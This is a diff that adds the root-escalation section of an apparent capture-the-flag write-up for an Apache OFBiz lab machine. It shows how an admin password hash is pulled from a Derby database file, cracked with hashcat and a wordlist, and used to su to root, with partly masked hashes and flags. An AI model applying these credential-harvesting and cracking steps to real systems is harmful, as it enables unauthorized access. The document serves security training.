@@ -124,3 +124,107 @@ user.txt
 cat user.txt
 bf37************************6c8d
 ```
+
+## Privileges escalation
+
+Escalation to root was pretty nasty, as it required a lot of searching for the valid trace. The first rabbit hole was a presence of `AdminUserLoginData.xml`, hidden under `/opt/ofbiz/framework/resources/templates` containing a hash of the password. Sadly, the has was unbreakable with usage of password dictionaries.
+
+The next step was a discovery of Derby database located in `/opt/ofbiz/runtime/data/derby/ofbiz`. As the search was exhausting, it was also fruitful. One of the partition file, `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat` contained a hash of interest.
+
+```bash
+ofbiz@bizness:/opt/ofbiz$ cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
+... SNIP ...
+    <map-HashMap>
+        <map-Entry>
+            <map-Key>
+                <std-String value="updatedUserLogin"/>
+            </map-Key>
+            <map-Value>
+                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$*************************2I"
+enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
+            </map-Value>
+        </map-Entry>
+        <map-Entry>
+            <map-Key>
+                <std-String value="locale"/>
+            </map-Key>
+
+... SNIP ...
+```
+
+The hash is utilizomg salting, which enhances security of the hash. The `SHA` stands for the algorithm and `d` is the salt.
+
+The way to crack this hash is to sanitize it and that, use `hashcat` which allows for cracking salted password. For SHA1 hashes, `hashcat` uses special mode `120`. Used wordlist is `rockyou.txt`
+
+```bash
+> hashcat -m 120 -a 0 -d 1 "b8************************************62:d" /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+... SNIP ...
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimim salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 0 secs
+
+b8************************************62:d:m***********s
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 120 (sha1($salt.$pass))
+Hash.Target......: b8************************************62:d
+Time.Started.....: Wed Mar 13 19:41:11 2024 (1 sec)
+Time.Estimated...: Wed Mar 13 19:41:12 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  5558.4 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1478656/14344385 (10.31%)
+Rejected.........: 0/1478656 (0.00%)
+Restore.Point....: 1476608/14344385 (10.29%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: *** -> ***
+Hardware.Mon.#1..: Util: 26%
+
+Started: Wed Mar 13 19:40:53 2024
+Stopped: Wed Mar 13 19:41:12 2024
+```
+
+Using cracked password, we can simply login as root and read the final flag.
+
+```bash
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su - root
+Password: 
+root@bizness:~# cat /root/root.txt 
+76****************************21
+```
